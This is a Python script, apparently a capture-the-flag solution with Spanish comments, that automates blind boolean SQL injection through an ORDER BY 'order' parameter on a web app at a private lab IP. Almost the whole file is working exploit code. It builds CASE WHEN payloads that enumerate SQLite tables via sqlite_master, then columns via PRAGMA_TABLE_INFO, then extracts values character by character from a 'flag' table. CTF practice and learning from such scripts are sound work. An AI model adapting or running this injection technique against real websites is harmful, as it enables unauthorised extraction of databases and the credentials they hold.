import requests
import string
import re

url = 'http://10.10.111.232/'
def send_payload(payload):
    req = requests.get(
            url,
            params = {
                'order': payload
            }
        )
    response = req.text
    if req.status_code == 200:
        # debes crear 2 items en la web, el "VERDADERO" debe tener una fecha anterior a la de "FALSO" (sql injection order by).
        if response.index("VERDADERO") < response.index("FALSO"):
            return True
    return False
def get_tables():
    # obtener la cantidad de tablas que existen.
    tablas = []
    for numero in range(20):
        payload = f'CASE WHEN (select 1 from sqlite_master where type = "table" and tbl_name NOT like "sqlite_%" limit 1 offset {numero}) THEN date ELSE title END'
        if send_payload(payload):
            tablas.append(numero)
        else:
            break
    print(f'[+] Total de tablas: {len(tablas)}')
    # obtener la longitud de cada tabla y luego obtener su nombre.
    tablas_nombres = []
    for tabla in tablas:
        tabla_nombre = ""
        for longitud in range(1, 255):
            payload = f'CASE WHEN (select length(name)={longitud} from sqlite_master where type = "table" and tbl_name NOT like "sqlite_%" limit 1 offset {tabla}) THEN date ELSE title END'
            if send_payload(payload):
                print(f"[+] Tabla {tabla} longitud: {longitud}")
                for posicion in range(1, longitud + 1):
                    for caracter in string.ascii_letters:
                        payload = f'CASE WHEN (select hex(substr(name,{posicion},1))=hex("{caracter}") from sqlite_master where type = "table" and tbl_name NOT like "sqlite_%" limit 1 offset {tabla}) THEN date ELSE title END'
                        if send_payload(payload):
                            tabla_nombre += caracter
                            print(f'[+] Tabla {tabla} de longitud {longitud}, posicion: {posicion}, valor: {caracter}')
                            break
                print(f'[+] Tabla {tabla} de longitud {longitud}: {tabla_nombre}')
                tablas_nombres.append(tabla_nombre)
                # parar porque se encontro todas las longitudes de las tablas.
                break
    return tablas
def get_columns(tabla):
    # obtener cuantas columnas existen en la tabla.
    columnas = []
    for numero in range(255):
        payload = f'CASE WHEN (SELECT 1 FROM PRAGMA_TABLE_INFO("{tabla}") limit 1 offset {numero}) THEN date ELSE title END'
        if send_payload(payload):
            columnas.append(numero)
            print(f'[+] Tabla {tabla} tiene {len(columnas)} columnas.')
        else:
            break
    # obtener la longitud del nombre de las columnas.
    columnas_nombres = []
    for columna in columnas:
        columna_nombre = ""
        for longitud in range(255):
            payload = f'CASE WHEN (SELECT length(name)={longitud} FROM PRAGMA_TABLE_INFO("{tabla}") limit 1 offset {columna}) THEN date ELSE title END'
            if send_payload(payload):
                print(f'[+] La columna {columna} tiene una longitud de {longitud}')
                for posicion in range(1, longitud + 1):
                    for caracter in string.ascii_letters:
                        payload = f'CASE WHEN (SELECT hex(substr(name,{posicion},1))=hex("{caracter}") FROM PRAGMA_TABLE_INFO("{tabla}") limit 1 offset {columna}) THEN date ELSE title END'
                        if send_payload(payload):
                            columna_nombre += caracter
                            print(f'[+] Tabla {tabla}, columna {columna}, posicion: {posicion}, valor: {caracter}')
                            break
                print(f'[+] Tabla {tabla}, columna {columna_nombre}')
                columnas_nombres.append(columna_nombre)
                break
def get_data(tabla, columna):
    # obtener la cantidad de valores que hay en la columna.
    valores = []
    for numero in range(255):
        payload = f'CASE WHEN (SELECT length({columna}) FROM {tabla} limit 1 offset {numero}) THEN date ELSE title END'
        if send_payload(payload):
            print(f'[+] La columna {columna} de la tabla {tabla} tiene {numero} valores.')
            valores.append(numero)
            break
    # obtener la longitud de los valores.
    valores_nombres = []
    for valor in valores:
        valor_nombre = ""
        for longitud in range(30, 40):
            payload = f'CASE WHEN (SELECT length({columna})={longitud} FROM {tabla} limit 1 offset {valor}) THEN date ELSE title END'
            if send_payload(payload):
                print(f'[+] La longitud del valor de la columna {columna} de la tabla {tabla}: {longitud}')
                for posicion in range(1, longitud + 1):
                    for caracter in string.printable[:-6]:
                        payload = f'CASE WHEN (SELECT hex(substr({columna},{posicion},1))=hex("{caracter}") FROM {tabla} limit 1 offset {valor}) THEN date ELSE title END'
                        if send_payload(payload):
                            valor_nombre += caracter
                            print(f'[+] Tabla {tabla}, columna {columna}, posicion: {posicion}, valor: {caracter}')
                            break
                print(f'[+] Tabla {tabla}, columna {columna}, valor: {valor_nombre}')
                valores_nombres.append(valor_nombre)
                break
""" get_tables()
get_columns('flag') """
get_data('flag', 'flag')